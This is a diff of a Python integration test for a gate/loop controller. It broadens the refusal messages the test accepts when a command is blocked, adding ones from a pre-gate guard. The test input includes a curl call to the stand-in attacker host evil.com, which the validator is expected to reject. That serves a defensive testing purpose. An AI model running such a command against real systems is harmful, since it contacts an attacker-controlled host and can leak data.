@@ -113,8 +113,18 @@ class TestPlanGateLoopControllerIntegration:
                 guard_inputs={"command": ["curl", "http://evil.com"], "working_dir": tmp},
             )
             assert r.valid is False
-            # Reason may be from the new decomposed AuthorityValidator or old format
-            assert any(phrase in r.reason.lower() for phrase in ("not permitted", "refused", "authority denied", "not authorized"))
+            # Reason may be from DeterministicGuard (pre-gate), AuthorityValidator, or old format
+            assert any(
+                phrase in r.reason.lower()
+                for phrase in (
+                    "not permitted",
+                    "refused",
+                    "authority denied",
+                    "not authorized",
+                    "not allowed",
+                    "pre-gate",
+                )
+            )
             state2 = controller.store.load("t1")
             assert state2 is not None
             assert state2.current_state == "PROPOSAL_VALIDATED"
